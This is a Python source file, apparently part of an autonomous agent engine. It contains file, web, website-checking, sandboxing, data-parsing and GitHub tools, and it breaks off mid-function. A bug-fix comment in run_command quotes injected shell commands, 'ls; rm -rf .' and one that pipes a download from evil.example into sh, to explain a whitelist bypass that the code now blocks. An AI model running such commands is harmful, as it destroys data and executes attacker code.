import os
import subprocess
import re
import time
import random
import json
import shutil
import zipfile
import io
import base64
import threading
import ast
import operator
import requests
import imaplib
import email
import smtplib
import resource
import ssl
import socket
import hashlib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# WORKDIR / PATH RESOLUTION
# ============================================================
# Defined first because many module-level constants below call
# workpath() immediately at import time (e.g. API_KEYS_FILE,
# TOOLS_DIR) — it must exist before that point in the file.

# Working directory — spawned agents set this to their own subfolder
WORKDIR = ""

def workpath(filename):
    """Resolve a filename relative to WORKDIR (empty = current dir)."""
    if WORKDIR and not os.path.isabs(filename):
        return os.path.join(WORKDIR, filename)
    return filename

# The actual filename of the script currently running. Spawned agents are
# copies of this same file living under generated_agents/<name>/agent.py —
# NOT main.py. Every self-upgrade/backup/rollback function below used to
# hardcode the literal string "main.py", which meant any spawned agent that
# tried to back itself up or self-upgrade would silently look for a file
# called "main.py" in its own workspace, find nothing, and crash (or just
# silently skip its self-check). Using this constant instead makes
# backup/rollback work correctly no matter which copy of the engine (root
# or spawned) is running.
SELF_FILE = os.path.basename(os.path.abspath(__file__))
BACKUP_PREFIX = SELF_FILE + ".backup_"
MAX_BACKUPS_KEPT = 5

# ============================================================
# BASIC FILE / SYSTEM TOOLS
# ============================================================

def read_file(filename):
    with open(filename, "r") as f:
        return f.read()

def write_file(filename, content):
    """
    BUG FIX: this used to open(filename, "w") directly and write in place.
    If the process dies mid-write — and this codebase has plenty of ways
    for that to happen: the sandboxed-subprocess OOM panics seen in
    self-test/fixer runs, a killed Replit workflow, a crash inside the
    dreamer thread — the target file is left truncated or half-written.
    For a JSON state file (tools_index.json, pending_ideas.json, etc.)
    that's a corrupted file, and every one of the ~30 unguarded
    json.loads(read_file(...)) call sites across this codebase would then
    raise on the NEXT read and could take down the whole process.
    Fix: write to a sibling temp file first, then atomically replace the
    target via os.replace() (an atomic rename on POSIX). A crash mid-write
    now only ever loses the temp file — the real target is either the old
    complete content or the new complete content, never a partial mix.
    """
    tmp_path = filename + ".tmp" + str(os.getpid())
    with open(tmp_path, "w") as f:
        f.write(content)
    os.replace(tmp_path, filename)

def _next_log_id(log, prefix):
    """
    BUG FIX: several append-only logs (decisions_log.json, council_log.json,
    real_world_actions.json, agenda.json) generated their next id as
    prefix + str(len(log) + 1), while their matching save_*() function
    truncates the same log to a max length (log[-MAX_..._LOGGED:]) to
    keep the file from growing forever. Once a log's true entry count
    exceeds that cap, len(log) after truncation no longer reflects how
    many entries have ever existed, so the length-based id starts
    colliding with an id already present in the (truncated) list —
    e.g. agenda.json caps at 20 entries: the 21st goal gets id "a21",
    which then truncates the list to the last 20 (dropping "a2"); the
    22nd goal computes "a" + str(len(20 items) + 1) = "a21" again,
    a duplicate of the goal added one step earlier. Any lookup by id
    (abandon_agenda_goal, revisit matching, council_id references from
    the real-world action gate, etc.) then silently matches the wrong
    entry. This is the exact same failure mode _next_tool_id() already
    guards against for tools_index.json — scan for the highest existing
    numeric suffix actually present instead of trusting the current
    (possibly-truncated) length.
    """
    max_n = 0
    for entry in log:
        m = re.match(r"^" + re.escape(prefix) + r"(\d+)$", str(entry.get("id", "")))
        if m:
            max_n = max(max_n, int(m.group(1)))
    return prefix + str(max_n + 1)

def read_json_file(filename, default):
    """
    Corruption-resilient replacement for the very common
    `json.loads(read_file(X)) if os.path.exists(X) else DEFAULT` pattern.
    If the file is missing, returns default. If the file exists but fails
    to parse (leftover corruption from before write_file() became atomic,
    a manually-edited bad file, disk issues, etc.), logs it instead of
    raising and returns default rather than crashing whatever called it.
    """
    if not os.path.exists(filename):
        return default
    try:
        return json.loads(read_file(filename))
    except (json.JSONDecodeError, OSError, UnicodeDecodeError) as e:
        print("WARNING: " + filename + " is corrupted or unreadable (" + str(e) +
              ") — falling back to default instead of crashing.")
        return default

def append_to_file(filename, content):
    with open(filename, "a") as f:
        f.write(content)

def edit_file(filename, old_text, new_text):
    content = read_file(filename)
    if old_text not in content:
        return "Could not find that text in " + filename + ". No changes made."
    new_content = content.replace(old_text, new_text)
    write_file(filename, new_content)
    return "Replaced text in " + filename + " successfully."

def list_directory():
    files = os.listdir(".")
    text_files = [f for f in files if os.path.isfile(f)]
    return ", ".join(text_files)

def search_files(search_term):
    matches = []
    for filename in os.listdir("."):
        if os.path.isfile(filename) and filename.endswith(".txt"):
            try:
                content = read_file(filename)
                if search_term.lower() in content.lower():
                    matches.append(filename)
            except Exception:
                pass
    if not matches:
        return "No files found containing '" + search_term + "'."
    return "Found '" + search_term + "' in: " + ", ".join(matches)

def search_web(query):
    try:
        response = requests.post(
            "https://api.firecrawl.dev/v2/search",
            headers={"Content-Type": "application/json"},
            json={"query": query, "limit": 3},
            timeout=30
        )
        data = response.json()
        if not data.get("success"):
            return "Web search failed: " + str(data)
        results = data.get("data", {}).get("web", [])
        if not results:
            return "No web results found."
        summary = ""
        for r in results:
            summary += "- " + r.get("title", "") + ": " + r.get("description", "") + " (" + r.get("url", "") + ")\n"
        return summary
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach web search (" + str(e) + ")"

def fetch_url(url):
    try:
        response = requests.post(
            "https://api.firecrawl.dev/v2/scrape",
            headers={"Content-Type": "application/json"},
            json={"url": url, "formats": ["markdown"]},
            timeout=30
        )
        data = response.json()
        if not data.get("success"):
            return "Could not fetch that page: " + str(data)
        content = data.get("data", {}).get("markdown", "")
        if not content:
            return "Page fetched but no content found."
        return content[:3000]
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach the page (" + str(e) + ")"

def _find_nix_chromium():
    """
    Locates a usable Chromium binary. Checked in this order:
      1. `pkgs.chromium` via shutil.which("chromium") — this turned out to
         be broken on Replit's specific Nix package snapshot: the binary
         was linked against a newer GLIBC than several of ITS OWN
         dependency libraries actually provide (confirmed via a live run:
         launch failed with "GLIBC_2.34 not found" etc. across libX11,
         libgio, libselinux, and others — a real Nix package-set
         inconsistency, not anything wrong with the setup steps that were
         followed). Kept as a first check in case a future Replit Nix
         snapshot fixes this, but expect it to usually fail here.
      2. `pkgs.playwright-chromium` — nixpkgs' Chromium build meant to be
         used with Playwright. CONFIRMED WORKING on Replit via a direct
         shell test: `chrome-wrapper --headless --disable-gpu --no-sandbox
         --dump-dom https://example.com` returned real rendered HTML. This
         is the one that should actually get used in practice.
      3. `pkgs.playwright-driver.browsers` — a different nixpkgs attribute
         with a similar purpose; kept as a fallback pattern in case that's
         what ends up installed instead, though it wasn't the one that
         was confirmed present/working here.
    Returns an executable path, or None if nothing is found (callers then
    fall back to Playwright's own bundled-download attempt, or ultimately
    to check_website_bugs_basic()/check_web_output_structural()).
    """
    path = shutil.which("chromium") or shutil.which("chromium-browser")
    if path:
        return path
    try:
        import glob
        candidates = (
            glob.glob("/nix/store/*-playwright-chromium/chrome-linux/chrome")
            + glob.glob("/nix/store/*-playwright-driver-browsers*/chromium-*/chrome-linux/chrome")
            + glob.glob("/nix/store/*playwright*browsers*/chromium-*/chrome-linux/chrome")
        )
        if candidates:
            # nixpkgs' own guidance for playwright-driver.browsers: Playwright
            # normally validates the host system against what it expects for
            # its own bundled browsers, which doesn't apply to this
            # separately-packaged binary — skip that check.
            os.environ.setdefault("PLAYWRIGHT_SKIP_VALIDATE_HOST_REQUIREMENTS", "true")
            return candidates[0]
    except Exception:
        pass
    return None

def check_website_bugs(url):
    """
    Loads a page in a real (headless) browser and checks for the kind of
    bugs a human would notice by clicking around: JS console errors, failed
    network requests, broken internal links, and a few basic on-page
    quality checks (missing title/meta description, images without alt
    text, forms with no action). Returns a formatted text report.

    Requires Playwright + the Chromium browser binary. If that's not
    installed yet, or Chromium can't launch (common on Replit — the default
    downloaded Chromium is linked against system libraries that don't exist
    in Replit's Nix environment), this transparently falls back to an
    HTTP-only check instead of just failing — see check_website_bugs_basic()
    below. Uses the same playwright_is_available() cached check that
    check_web_output() already relies on elsewhere in this file, so both
    features agree on whether the browser path is usable.
    """
    if not url.startswith("http"):
        url = "https://" + url

    if not playwright_is_available():
        return check_website_bugs_basic(url) + (
            "\n\n(Browser checks skipped — Playwright/Chromium isn't usable here, "
            "so JS console errors couldn't be checked (the static action-attribute "
            "check above still ran). On Replit, add `pkgs.chromium` to replit.nix, "
            "restart the Repl, then point Playwright at it with "
            "executable_path=shutil.which(\"chromium\") instead of running "
            "`playwright install chromium`, which downloads a binary that's "
            "incompatible with Replit's Nix environment.)"
        )

    from playwright.sync_api import sync_playwright
    console_errors = []
    console_warnings = []
    failed_requests = []

    try:
        with sync_playwright() as p:
            chromium_path = _find_nix_chromium()
            # --no-sandbox and --disable-gpu are required here, not
            # optional: confirmed via a direct shell test on Replit that
            # the playwright-chromium binary works headlessly ONLY with
            # these flags — Chromium's normal sandboxing needs a setuid
            # helper binary that isn't set up this way in Replit's
            # container, so launches fail without --no-sandbox.
            browser = p.chromium.launch(
                headless=True, executable_path=chromium_path,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
            )
            page = browser.new_page()

            page.on("console", lambda msg: (
                console_errors.append(msg.text) if msg.type == "error"
                else console_warnings.append(msg.text) if msg.type == "warning"
                else None
            ))
            # Uncaught JS exceptions (e.g. a ReferenceError from a broken
            # inline <script>) fire via "pageerror", NOT "console" — missed
            # this on the first pass and confirmed it with a local test page
            # before adding it: console.error() calls were being caught,
            # but an actual thrown/uncaught exception was silently dropped.
            page.on("pageerror", lambda exc: console_errors.append("Uncaught exception: " + str(exc)))
            page.on("requestfailed", lambda req: failed_requests.append(
                req.url + " (" + (req.failure["errorText"] if req.failure else "request failed") + ")"
            ))
            page.on("response", lambda res: (
                failed_requests.append(res.url + " (HTTP " + str(res.status) + ")")
                if res.status >= 400 else None
            ))

            try:
                response = page.goto(url, timeout=20000, wait_until="networkidle")
            except Exception:
                # Some pages never go fully idle (polling, websockets, ads) —
                # fall back to a looser wait rather than failing the whole check.
                response = page.goto(url, timeout=20000, wait_until="load")

            status = response.status if response else None
            title = page.title()
            has_meta_desc = page.locator('meta[name="description"]').count() > 0
            images_missing_alt = page.eval_on_selector_all(
                "img", "imgs => imgs.filter(i => !i.alt).length"
            )
            forms_missing_action = page.eval_on_selector_all(
                "form", "forms => forms.filter(f => !f.getAttribute('action')).length"
            )
            origin = url.split("//")[0] + "//" + url.split("//")[1].split("/")[0]
            internal_links = page.eval_on_selector_all(
                "a[href]",
                "(as, base) => [...new Set(as.map(a => a.href).filter(h => h.startsWith(base)))].slice(0, 15)",
                origin
            )
            browser.close()
    except Exception as e:
        # The browser launch itself failed despite playwright_is_available()
        # passing earlier (e.g. it succeeded on a trivial page but this site
        # trips something else) — still better to hand back an HTTP-only
        # report than nothing.
        return check_website_bugs_basic(url) + "\n\n(Browser check failed partway through: " + str(e) + ")"

    broken_links = []
    for link in internal_links:
        try:
            r = requests.head(link, timeout=8, allow_redirects=True)
            if r.status_code >= 400:
                broken_links.append(link + " (HTTP " + str(r.status_code) + ")")
        except requests.exceptions.RequestException:
            broken_links.append(link + " (unreachable)")

    report = [
        "Bug report for " + url,
        "Page status: " + str(status),
        "Title: " + (title or "(missing)"),
        "Meta description: " + ("present" if has_meta_desc else "MISSING"),
        "Images missing alt text: " + str(images_missing_alt),
        "Forms missing action attribute: " + str(forms_missing_action),
        "Console errors: " + str(len(console_errors)),
    ]
    report.extend("  - " + e[:200] for e in console_errors[:10])
    report.append("Console warnings: " + str(len(console_warnings)))
    report.append("Failed/4xx-5xx network requests: " + str(len(failed_requests)))
    report.extend("  - " + f[:200] for f in failed_requests[:10])
    report.append("Internal links sampled: " + str(len(internal_links)) +
                   " | broken: " + str(len(broken_links)))
    report.extend("  - " + b for b in broken_links)

    return "\n".join(report)

def _check_security_headers(headers):
    """Checks response headers for common security headers. Returns a
    list of missing ones with a one-line note each. Passive only —
    no probing beyond reading the headers already returned."""
    expected = [
        ("Strict-Transport-Security", "HSTS not enforced"),
        ("Content-Security-Policy", "no CSP set (XSS defense-in-depth)"),
        ("X-Content-Type-Options", "MIME-sniffing not blocked"),
        ("X-Frame-Options", "clickjacking not blocked"),
        ("Referrer-Policy", "no referrer policy set"),
    ]
    lower_headers = {k.lower() for k in headers.keys()}
    return [h + " — " + note for h, note in expected if h.lower() not in lower_headers]

def check_tls_cert_expiry(hostname, port=443, warn_days=30):
    """Connects via TLS and reports how many days remain before the
    certificate expires. Purely informational — establishes a normal
    TLS handshake, reads the cert, nothing else."""
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
        expires = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
        days_left = (expires - datetime.utcnow()).days
        if days_left < 0:
            return "TLS cert EXPIRED " + str(-days_left) + " day(s) ago"
        if days_left <= warn_days:
            return "TLS cert expires in " + str(days_left) + " day(s) — renew soon"
        return "TLS cert valid, expires in " + str(days_left) + " day(s)"
    except Exception as e:
        return "Could not check TLS cert: " + str(e)

def check_website_bugs_basic(url):
    """
    HTTP-only fallback for check_website_bugs() — no browser required, so
    this always works regardless of whether Chromium is set up. Catches
    status errors, broken internal links, and missing title/meta
    description via plain requests + regex (same style as the rest of
    this file's lightweight parsing — no new dependency on something like
    BeautifulSoup just for this). Can't see JS console errors or broken
    forms without an actual browser; that's the tradeoff.
    """
    try:
        resp = requests.get(url, timeout=15)
    except requests.exceptions.RequestException as e:
        return "Bug report for " + url + "\nCould not reach the page: " + str(e)

    html = resp.text
    title_match = re.search(r"<title[^>]*>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    title = title_match.group(1).strip() if title_match else None
    has_meta_desc = bool(re.search(r'<meta[^>]+name=["\']description["\']', html, re.IGNORECASE))
    images_missing_alt = len(re.findall(r"<img(?![^>]*\balt=)[^>]*>", html, re.IGNORECASE))
    forms_missing_action = len(re.findall(r"<form(?![^>]*\baction=)[^>]*>", html, re.IGNORECASE))

    origin = url.split("//")[0] + "//" + url.split("//")[1].split("/")[0]
    raw_links = re.findall(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE)
    internal_links = []
    for link in raw_links:
        if link.startswith("/"):
            link = origin + link
        if link.startswith(origin) and link not in internal_links:
            internal_links.append(link)
        if len(internal_links) >= 15:
            break

    broken_links = []
    for link in internal_links:
        try:
            r = requests.head(link, timeout=8, allow_redirects=True)
            if r.status_code >= 400:
                broken_links.append(link + " (HTTP " + str(r.status_code) + ")")
        except requests.exceptions.RequestException:
            broken_links.append(link + " (unreachable)")

    report = [
        "Bug report for " + url + " (HTTP-only check)",
        "Page status: " + str(resp.status_code),
        "Title: " + (title or "(missing)"),
        "Meta description: " + ("present" if has_meta_desc else "MISSING"),
        "Images missing alt text: " + str(images_missing_alt),
        "Forms missing action attribute: " + str(forms_missing_action),
        "Internal links sampled: " + str(len(internal_links)) +
            " | broken: " + str(len(broken_links)),
    ]
    report.extend("  - " + b for b in broken_links)

    is_https = url.startswith("https://")
    report.append("Protocol: " + ("HTTPS" if is_https else "HTTP (not encrypted) — MISSING"))
    if is_https:
        hostname = origin.split("//")[1].split(":")[0]
        report.append(check_tls_cert_expiry(hostname))
        missing_headers = _check_security_headers(resp.headers)
        if missing_headers:
            report.append("Missing security headers:")
            report.extend("  - " + m for m in missing_headers)
        else:
            report.append("Security headers: all common ones present")

    return "\n".join(report)

def format_bug_report_for_email(url, raw_report):
    """
    Turns the terse, bullet-style output of check_website_bugs() /
    check_website_bugs_basic() into full English paragraphs suitable for
    an email. Deliberately does this with plain string parsing instead of
    another ask_ai() call — an email report is exactly the kind of thing
    that should still show up even if the AI API is rate-limited or a key
    is down (a real, observed failure mode in this project — see the
    "ERROR: rate limited on key #1" messages from earlier testing), so it
    shouldn't depend on the API being healthy. The raw report's line
    format is entirely controlled by our own two check functions above, so
    parsing it here isn't fragile the way parsing an arbitrary external
    document would be.
    Returns (subject, body) as plain text.
    """
    lines = raw_report.split("\n")
    fields = {}
    console_error_lines = []
    failed_request_lines = []
    broken_link_lines = []
    fallback_note = None
    section = None

    for line in lines:
        stripped = line.strip()
        if stripped.startswith("- ") or line.startswith("  - "):
            item = stripped[2:].strip()
            if section == "console_errors":
                console_error_lines.append(item)
            elif section == "failed_requests":
                failed_request_lines.append(item)
            elif section == "broken_links":
                broken_link_lines.append(item)
            continue
        if line.startswith("Page status:"):
            fields["status"] = line.split(":", 1)[1].strip()
        elif line.startswith("Title:"):
            fields["title"] = line.split(":", 1)[1].strip()
        elif line.startswith("Meta description:"):
            fields["meta"] = line.split(":", 1)[1].strip()
        elif line.startswith("Images missing alt text:"):
            fields["alt"] = line.split(":", 1)[1].strip()
        elif line.startswith("Forms missing action attribute:"):
            fields["forms"] = line.split(":", 1)[1].strip()
        elif line.startswith("Console errors:"):
            fields["console_errors_count"] = line.split(":", 1)[1].strip()
            section = "console_errors"
        elif line.startswith("Console warnings:"):
            fields["console_warnings_count"] = line.split(":", 1)[1].strip()
            section = None
        elif line.startswith("Failed/4xx-5xx network requests:"):
            fields["failed_requests_count"] = line.split(":", 1)[1].strip()
            section = "failed_requests"
        elif line.startswith("Internal links sampled:"):
            rest = line.split(":", 1)[1].strip()
            sampled, _, broken = rest.partition("|")
            fields["links_sampled"] = sampled.strip()
            fields["links_broken"] = broken.replace("broken:", "").strip()
            section = "broken_links"
        elif stripped.startswith("(Browser checks skipped") or stripped.startswith("(Browser check failed"):
            fallback_note = stripped.strip("()")
            section = None

    is_basic = "(HTTP-only check)" in lines[0] if lines else False

    p = []
    p.append("Here's the bug report for " + url + ", checked on " + time.strftime("%B %d, %Y at %I:%M %p") + ".")

    status = fields.get("status", "unknown")
    if status.isdigit() and int(status) >= 400:
        p.append("The page returned an error status of " + status + ", which means it may not be loading correctly for visitors at all.")
    elif status == "200":
        p.append("The page loaded successfully with a normal 200 status.")
    else:
        p.append("The page returned a status of " + status + ".")

    title = fields.get("title", "(missing)")
    if title == "(missing)":
        p.append("It's missing a page title, which is worth fixing since the title is what shows up in browser tabs and search results.")
    else:
        p.append("The page title is \"" + title + "\".")

    if fields.get("meta") == "MISSING":
        p.append("There's no meta description set, which can hurt how the page appears when shared or found through search engines.")

    alt = fields.get("alt", "0")
    if alt != "0":
        p.append("There " + ("is 1 image" if alt == "1" else "are " + alt + " images") + " missing alt text, which affects accessibility for people using screen readers.")

    forms = fields.get("forms", "0")
    if forms != "0":
        p.append("There " + ("is 1 form" if forms == "1" else "are " + forms + " forms") + " on the page missing an action attribute, meaning submitting it may silently do nothing.")

    if not is_basic:
        err_count = fields.get("console_errors_count", "0")
        if err_count != "0":
            block = "The browser reported " + err_count + " JavaScript console error(s) while the page was loading:\n"
            block += "\n".join("  • " + e for e in console_error_lines)
            p.append(block)
        else:
            p.append("No JavaScript console errors were seen while the page loaded.")

        fail_count = fields.get("failed_requests_count", "0")
        if fail_count != "0":
            block = "There " + ("was 1 network request" if fail_count == "1" else "were " + fail_count + " network requests") + " that failed or returned an error status:\n"
            block += "\n".join("  • " + f for f in failed_request_lines)
            p.append(block)

    broken = fields.get("links_broken", "0")
    sampled = fields.get("links_sampled", "0")
    if broken != "0":
        block = "Out of " + sampled + " internal links checked, " + broken + " came back broken:\n"
        block += "\n".join("  • " + b for b in broken_link_lines)
        p.append(block)
    elif sampled != "0":
        p.append("All " + sampled + " internal links that were checked came back working fine.")

    if fallback_note:
        p.append("Note: " + fallback_note)

    body = "\n\n".join(p)
    subject = "Website bug report: " + url
    return subject, body

def run_command(command):
    # BUG FIX: this only ever whitelisted the FIRST token of the command
    # (base = command.split()[0]) but then executed the entire raw string
    # via subprocess.run(..., shell=True). Since shell=True hands the whole
    # string to /bin/sh, shell metacharacters in anything after that first
    # token were still interpreted — e.g. "ls; rm -rf ." or
    # "ls && curl evil.example | sh" both pass the "base in allowed_commands"
    # check (base == "ls") and then execute arbitrary chained commands.
    # The whitelist was effectively decorative. Fixed by rejecting shell
    # metacharacters outright and invoking the command as an argv list with
    # shell=False, so there's no shell to interpret them even if one slips
    # through.
    import shlex
    allowed_commands = ["ls", "pwd", "date", "whoami"]
    stripped = command.strip()
    if not stripped:
        return "That command is not allowed for safety reasons."
    if re.search(r'[;&|`$<>\n\\]|\$\(|&&|\|\|', stripped):
        return "That command is not allowed for safety reasons."
    try:
        parts = shlex.split(stripped)
    except ValueError:
        return "That command is not allowed for safety reasons."
    if not parts or parts[0] not in allowed_commands:
        return "That command is not allowed for safety reasons."
    try:
        result = subprocess.run(parts, shell=False, capture_output=True, text=True, timeout=10)
    except subprocess.TimeoutExpired:
        return "Command timed out."
    return result.stdout

def calculate(expression):
    allowed_chars = "0123456789+-*/(). "
    if not all(c in allowed_chars for c in expression):
        return "Invalid characters in expression."
    _ops = {
        ast.Add: operator.add, ast.Sub: operator.sub,
        ast.Mult: operator.mul, ast.Div: operator.truediv,
        ast.USub: operator.neg, ast.UAdd: operator.pos,
    }
    def _eval(node):
        if isinstance(node, ast.Constant):
            return node.value
        if isinstance(node, ast.BinOp):
            return _ops[type(node.op)](_eval(node.left), _eval(node.right))
        if isinstance(node, ast.UnaryOp):
            return _ops[type(node.op)](_eval(node.operand))
        raise ValueError("Unsupported expression")
    try:
        tree = ast.parse(expression, mode="eval")
        result = _eval(tree.body)
        return "Result: " + str(result)
    except Exception as e:
        return "Could not calculate: " + str(e)

# ------------------------------------------------------------
# Structured data tool (CSV / JSON)
# ------------------------------------------------------------
# calculate() handles math, but nothing understands tabular/nested
# data. Scrapes (Firecrawl) and GitHub Actions logs often come back as
# messy JSON or CSV — this lets a tool chain query/filter/convert that
# data directly instead of round-tripping through write_code() and a
# sandbox run every time.

def _load_structured(filepath_or_text):
    """Loads CSV or JSON from a file path or raw text string.
    Returns (kind, data) where kind is 'csv' or 'json', and data is
    a list of dicts (csv) or the parsed JSON value. Raises ValueError
    if it can't figure out the format."""
    import csv as _csv
    text = filepath_or_text
    is_path = False
    if os.path.exists(filepath_or_text):
        is_path = True
        with open(filepath_or_text, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()

    stripped = text.strip()
    looks_json = stripped.startswith("{") or stripped.startswith("[")
    if is_path and filepath_or_text.lower().endswith(".csv"):
        looks_json = False
    elif is_path and filepath_or_text.lower().endswith(".json"):
        looks_json = True

    if looks_json:
        try:
            return "json", json.loads(stripped)
        except Exception as e:
            raise ValueError("Could not parse as JSON: " + str(e))
    else:
        try:
            reader = _csv.DictReader(io.StringIO(text))
            rows = list(reader)
            if not rows:
                raise ValueError("No rows found.")
            return "csv", rows
        except Exception as e:
            raise ValueError("Could not parse as CSV: " + str(e))

def _flatten_for_query(data):
    """Normalizes either a list of dicts (csv) or arbitrary JSON into a
    list of dicts for filter/extract operations. If JSON is a dict
    with one list-valued key, unwraps it (common API response shape)."""
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        list_vals = [v for v in data.values() if isinstance(v, list)]
        if len(list_vals) == 1:
            return list_vals[0]
        return [data]
    return [{"value": data}]

_FILTER_RE = re.compile(r"^\s*([\w.\-]+)\s*(==|!=|>=|<=|>|<)\s*(.+?)\s*$")

def _apply_filter(rows, query):
    """query like: status == 'active'  or  price > 100"""
    m = _FILTER_RE.match(query)
    if not m:
        return None, "Filter format: field == value  (operators: == != > < >= <=)"
    field, op, raw_val = m.groups()
    raw_val = raw_val.strip("'\"")
    def _coerce(v):
        try:
            return float(v)
        except (TypeError, ValueError):
            return v
    target = _coerce(raw_val)
    ops = {
        "==": lambda a, b: str(a) == str(b) if not isinstance(a, (int, float)) or not isinstance(b, (int, float)) else a == b,
        "!=": lambda a, b: not (str(a) == str(b)) if not isinstance(a, (int, float)) or not isinstance(b, (int, float)) else a != b,
        ">": operator.gt, "<": operator.lt, ">=": operator.ge, "<=": operator.le,
    }
    out = []
    for row in rows:
        if not isinstance(row, dict) or field not in row:
            continue
        val = _coerce(row[field])
        try:
            if ops[op](val, target):
                out.append(row)
        except TypeError:
            continue
    return out, None

def parse_structured_data(filepath_or_text, operation="summary", query=None):
    """
    Single entry point for tabular/nested data. Detects CSV vs JSON.
    operation:
      'summary' - row/column count, keys, sample
      'filter'  - query like "status == 'active'", returns matching rows
      'extract' - query is a field/column name, returns that column's values
      'to_json' - converts CSV -> JSON text
      'to_csv'  - converts JSON (list of flat dicts) -> CSV text
    Returns a string (safe to print or feed back into a tool chain).
    """
    try:
        kind, data = _load_structured(filepath_or_text)
    except ValueError as e:
        return "Error: " + str(e)

    rows = _flatten_for_query(data)

    if operation == "summary":
        cols = sorted({k for r in rows if isinstance(r, dict) for k in r.keys()})
        sample = json.dumps(rows[0], default=str) if rows else "{}"
        return ("Format: " + kind + " | rows: " + str(len(rows)) +
                " | columns: " + (", ".join(cols) if cols else "n/a") +
                "\nSample row: " + sample[:300])

    if operation == "filter":
        if not query:
            return "Error: 'filter' requires a query, e.g. \"status == 'active'\""
        result, err = _apply_filter(rows, query)
        if err:
            return "Error: " + err
        return json.dumps(result, default=str, indent=2)[:4000]

    if operation == "extract":
        if not query:
            return "Error: 'extract' requires a field/column name"
        values = [r.get(query) for r in rows if isinstance(r, dict) and query in r]
        if not values:
            return "Error: field '" + query + "' not found in data."
        return json.dumps(values, default=str)[:4000]

    if operation == "to_json":
        return json.dumps(rows, default=str, indent=2)[:6000]

    if operation == "to_csv":
        import csv as _csv
        if not rows or not isinstance(rows[0], dict):
            return "Error: data isn't a flat list of objects, can't convert to CSV."
        buf = io.StringIO()
        writer = _csv.DictWriter(buf, fieldnames=sorted(rows[0].keys()))
        writer.writeheader()
        for r in rows:
            writer.writerow(r)
        return buf.getvalue()[:6000]

    return "Unknown operation: " + operation + " (use summary/filter/extract/to_json/to_csv)"

def strip_fences(code):
    code = code.strip()
    if code.startswith("```"):
        code = code.split("\n", 1)[1] if "\n" in code else code
        if code.endswith("```"):
            code = code.rsplit("```", 1)[0]
    return code.strip()

# ============================================================
# SANDBOXED EXECUTION (resource limits + isolated env/cwd)
# ============================================================

SANDBOX_CPU_SECONDS = 20          # hard CPU-time cap for any generated tool
# RLIMIT_AS caps *virtual address space*, not actual resident memory used.
# Go binaries (any tool that shells out to something Go-compiled — gh, esbuild,
# etc.) reserve a large chunk of virtual address space up front just to
# initialize their runtime's page allocator, even for a trivial program that
# will use almost no real memory. Below ~512MB that reservation fails outright
# with "fatal error: failed to reserve page summary memory" BEFORE any of the
# tool's actual logic runs — every such failure looks identical regardless of
# what the tool does, and no amount of AI-driven code patching can fix an
# environment-level ulimit. 1024MB leaves real headroom above that floor while
# still bounding runaway/malicious Python tools.
SANDBOX_MEMORY_MB = 1536          # hard memory cap (RLIMIT_AS) for any generated tool — bumped
# from 1024 for extra headroom above the Go-runtime reservation floor; see
# _is_environmental_failure() / _fixer_attempt_repairs() below for how a
# self-test/fix pass now recognizes and skips this exact signature instead
# of wasting AI-driven fix attempts on an environment-level ceiling.

def _sandbox_limits():
    """
    Passed as preexec_fn to subprocess.run for any generated/untrusted
    code. Runs in the child process right after fork, before exec.
    Caps CPU time and total address-space memory so a runaway or
    malicious tool can't hang or exhaust the host. Linux/Replit only —
    no-op (caught) on platforms without the resource module's limits.
    """
    try:
        resource.setrlimit(resource.RLIMIT_CPU, (SANDBOX_CPU_SECONDS, SANDBOX_CPU_SECONDS))
        mem_bytes = SANDBOX_MEMORY_MB * 1024 * 1024
        resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
    except Exception:
        pass  # platform doesn't support these limits — fail open rather than crash the run

def run_sandboxed_python(filepath, args=None, input_text=None, timeout=30, extra_env=None):
    """
    Runs a generated/imported Python tool with:
      - CPU + memory limits (via _sandbox_limits)
      - a minimal environment (no inherited secrets like GITHUB_TOKEN,
        CEREBRAS_API_KEY, AGENT_EMAIL/APP_PASSWORD unless explicitly passed)
      - cwd scoped to the tool's own folder (can't read project files,
        tools_index.json, memory files, etc. by relative path)
      - a hard wall-clock timeout as a second layer beyond RLIMIT_CPU
    Returns (success: bool, output: str).
    """
    safe_env = {"PATH": os.environ.get("PATH", ""), "PYTHONIOENCODING": "utf-8"}
    if extra_env:
        safe_env.update(extra_env)
    try:
        result = subprocess.run(
            ["python3", os.path.basename(filepath)] + (args or []),
            cwd=os.path.dirname(os.path.abspath(filepath)) or ".",
            env=safe_env,
            input=input_text,
            capture_output=True, text=True, timeout=timeout,
            preexec_fn=_sandbox_limits if os.name != "nt" else None
        )
        output = (result.stdout or "") + (("\n[stderr]\n" + result.stderr) if result.stderr else "")
        return result.returncode == 0, output[:1500]
    except subprocess.TimeoutExpired:
        return False, "Timed out after " + str(timeout) + "s (sandboxed run)."
    except Exception as e:
        return False, "Sandboxed run failed: " + str(e)

# ============================================================
# GITHUB HELPERS
# ============================================================

def github_headers():
    token = os.environ.get("GITHUB_TOKEN")
    if not token:
        return None
    return {"Authorization": "Bearer " + token, "Accept": "application/vnd.github+json"}

def _github_json(response):
    """
    BUG FIX: every GitHub call used to do response.json() directly and only
    caught requests.exceptions.RequestException around it. GitHub sometimes
    returns non-JSON bodies (HTML error pages on 502/503, empty bodies on
    204, rate-limit pages), which raises json.JSONDecodeError — a ValueError
    subclass, NOT a RequestException — so it was never actually caught and
    would blow up the caller instead of returning a clean error string.
    """
    try:
        return response.json()
    except ValueError:
        return {"message": "Non-JSON response from GitHub (status " + str(response.status_code) + "): " + response.text[:200]}

def get_github_username():
    headers = github_headers()
    if headers is None:
        return ""
    try:
        response = requests.get("https://api.github.com/user", headers=headers, timeout=30)
        return _github_json(response).get("login", "")
    except requests.exceptions.RequestException:
        return ""

def create_github_repo(repo_name, description="Created by my agent", private=False):
    headers = github_headers()
    if headers is None:
        return "Could not create repo: GITHUB_TOKEN environment variable is not set."
    try:
        response = requests.post(
